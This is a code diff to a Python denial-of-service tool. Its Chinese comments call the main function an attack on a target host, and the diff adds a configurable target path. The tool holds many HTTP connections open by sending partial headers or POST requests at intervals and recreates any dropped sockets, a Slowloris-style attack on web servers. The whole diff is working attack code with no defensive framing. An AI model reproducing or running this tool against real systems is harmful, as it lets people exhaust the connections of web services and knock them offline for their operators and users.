@@ -16,11 +16,12 @@ class Mode(Enum):
     READ = 3
 
 
-def init_socket(mode, host, port, https, randuseragent):
+def init_socket(mode, host, port, path, https, randuseragent):
     """
     初始化一个用于 HTTP/HTTPS 的 socket
     :param mode: Mode 类型, 攻击模式
     :param host: str, 目标主机
+    :param path: str, 攻击路径
     :param port: int, 目标端口
     :param https: boolean, 是否使用 https
     :param randuseragent: boolean, 是否使用随机 User-Agent
@@ -39,12 +40,12 @@ def init_socket(mode, host, port, https, randuseragent):
         ua = random.choice(user_agents)
 
     if mode == Mode.HEADER:
-        send_line(s, f"GET /?{random.randint(0, 2000)} HTTP/1.1")
+        send_line(s, f"GET {path}?{random.randint(0, 2000)} HTTP/1.1")
         send_header(s, "Host", host)
         send_header(s, "User-Agent", ua)
         send_header(s, "Accept-language", "en-US,en,q=0.5")
     elif mode == Mode.POST:
-        send_line(s, f"POST /?{random.randint(0, 2000)} HTTP/1.1")
+        send_line(s, f"POST {path} HTTP/1.1")
         send_header(s, "Host", host)
         send_header(s, "User-Agent", ua)
         send_header(s, "Accept-language", "en-US,en,q=0.5")
@@ -54,12 +55,13 @@ def init_socket(mode, host, port, https, randuseragent):
     return s
 
 
-def attack(mode, host, port, sockets, sleeptime, https, randuseragent):
+def attack(mode, host, port, path, sockets, sleeptime, https, randuseragent):
     """
     发起攻击
     :param mode: Mode 类型, 攻击模式
     :param host: str, 目标主机
     :param port: int, 目标端口
+    :param path: str, 攻击路径
     :param sockets: int, 并发数
     :param sleeptime: int, 两次发送以维持 socket 不断开的间隔时间
     :param https: boolean, 是否使用 https
@@ -75,7 +77,7 @@ def attack(mode, host, port, sockets, sleeptime, https, randuseragent):
     for _ in range(socket_count):
         try:
             logging.debug("Creating socket nr %s", _)
-            s = init_socket(mode, ip, port, https, randuseragent)
+            s = init_socket(mode, ip, port, path, https, randuseragent)
         except socket.error as e:
             logging.debug(e)
             break
@@ -101,7 +103,7 @@ def attack(mode, host, port, sockets, sleeptime, https, randuseragent):
             logging.debug("Recreating sockets...")
             for _ in range(socket_count - len(list_of_sockets)):
                 try:
-                    s = init_socket(mode, ip, port, https, randuseragent)
+                    s = init_socket(mode, ip, port, path, https, randuseragent)
                     logging.debug("Recreating socket")
                     if s:
                         list_of_sockets.append(s)
@@ -117,5 +119,6 @@ def attack(mode, host, port, sockets, sleeptime, https, randuseragent):
 
 
 if __name__ == "__main__":
-    args = get_args()
-    attack(Mode[args.mode.upper()], args.host, args.port, args.sockets, args.sleeptime, args.https, args.randuseragent)
+    # print(get_args())
+    args, https, host, port, path = get_args()
+    attack(Mode[args.mode.upper()], host, port, path, args.sockets, args.sleeptime, https, args.randuseragent)
